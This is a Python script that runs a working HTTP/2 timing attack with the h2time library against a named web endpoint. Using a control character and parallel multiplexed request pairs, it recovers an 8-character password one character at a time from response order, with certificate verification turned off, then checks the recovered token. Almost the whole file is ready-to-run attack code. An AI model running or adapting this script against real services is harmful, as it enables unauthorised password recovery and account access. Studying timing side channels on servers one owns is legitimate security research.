from h2time import H2Time, H2Request
import asyncio
import string
import logging
import json
import statistics

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('research')
logging.getLogger('H2Protocol').setLevel(logging.WARNING)  # Disable H2Protocol logger

BASE_URL = "https://hurtleturtle.co.uk:8000"

async def create_auth_request(token: str) -> H2Request:
    """Create an H2Request with the specified Authorization token."""
    return H2Request(
        method="GET",
        url=f"{BASE_URL}/process?password={token}",
        headers={
            "User-Agent": "h2time/0.1"
        }
    )

async def perform_timing_attack(token_prefix: str) -> set:
    """Perform a timing attack to find the next character in the token."""
    # Use the exact character set from our password
    char_set = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    potential_chars = set()
    order_results = {}
    
    for char in char_set:   
        r1 = await create_auth_request(token_prefix + char)
        r2 = await create_auth_request(token_prefix + "$")  # Control character
        
        async with H2Time(r1, r2, 
                         num_request_pairs=5,
                         sequential=False,  # Important: Use parallel mode to exploit HTTP/2 multiplexing
                         inter_request_time_ms=0,  # No delay between requests
                         verify_cert=False) as h2t:
            results = await h2t.run_attack()
            if results:
                # Count how many times r1 (test char) came before r2 (control)
                r1_first = len([r for r in results if r[0] < 0])
                r2_first = len([r for r in results if r[0] > 0])
                total = r1_first + r2_first
                
                if total > 0:
                    # Calculate percentage of times r1 came first
                    r1_first_percent = (r1_first / total) * 100
                    order_results[char] = r1_first_percent
                    
                    logger.info(f"Char: {char}, R1 first: {r1_first}/{total} ({r1_first_percent:.1f}%)")
                    
                    # If r1 comes first significantly more often, it's likely correct
                    if r1_first_percent > 60:  # More than 60% of the time
                        potential_chars.add(char)
                        
                    # If r1 comes first 90% of the time, it's almost certainly correct
                    if r1_first_percent >= 90:
                        return [(char, f'{r1_first_percent:.1f}%')]
    
    # Sort and log potential characters by response order percentage
    sorted_chars = sorted(order_results.items(), key=lambda x: x[1], reverse=True)
    logger.info(f"Top 3 potential chars by response order: {[(c, f'{p:.1f}%') for c, p in sorted_chars[:3]]}")
    
    return sorted_chars

async def find_token() -> str:
    """Find the complete token using timing attacks."""
    token = ""
    max_length = 8  # We know the password is 8 characters
    
    while len(token) < max_length:
        next_char_set = await perform_timing_attack(token)
        if not next_char_set:
            logger.warning(f"No clear response order difference found for position {len(token)}")
            break
            
        # Take the character with the highest response order percentage
        if len(next_char_set) == 1:
            token += next_char_set.pop()[0]
            logger.info(f"Found token so far: {token}")
        else:
            # If multiple potential chars, take the one with highest response order percentage
            token += next_char_set[0][0]
            logger.info(f"Multiple potential chars found, selected {next_char_set[0]}. Token so far: {token}")
    
    if token:
        logger.info(f"Found complete token: {token}")
        # Verify the token
        verify_request = await create_auth_request(token)
        async with H2Time(verify_request, verify_request, num_request_pairs=1, verify_cert=False) as h2t:
            results = await h2t.run_attack()
            if results and results[0][1] == "200":
                logger.info("Token verified successfully!")
            else:
                logger.warning("Token verification failed!")
    else:
        logger.error("No token found - endpoint not vulnerable")

    return token

if __name__ == "__main__":
    try:
        asyncio.run(find_token())
    except KeyboardInterrupt:
        logger.info("Interrupted by user")


